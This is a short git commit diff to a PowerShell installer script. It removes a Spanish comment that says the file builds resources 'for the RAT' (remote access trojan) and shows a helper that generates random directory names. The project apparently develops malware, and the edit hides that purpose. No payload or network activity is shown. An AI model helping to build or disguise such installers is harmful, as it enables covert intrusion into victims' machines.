aae50e63a75702c338359e007e9bd064dd8769f2
tobiasasa <tobias.asa@hotmail.com>
2022-09-20 15:51:08 -0700

    asd

--- files/installer.ps1
+++ files/installer.ps1
@@ -1,5 +1,4 @@
-# Construir	recursos para el RAT
-
+#Recursos
 #String random nombre de directorios.
 function random_text {
 	return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
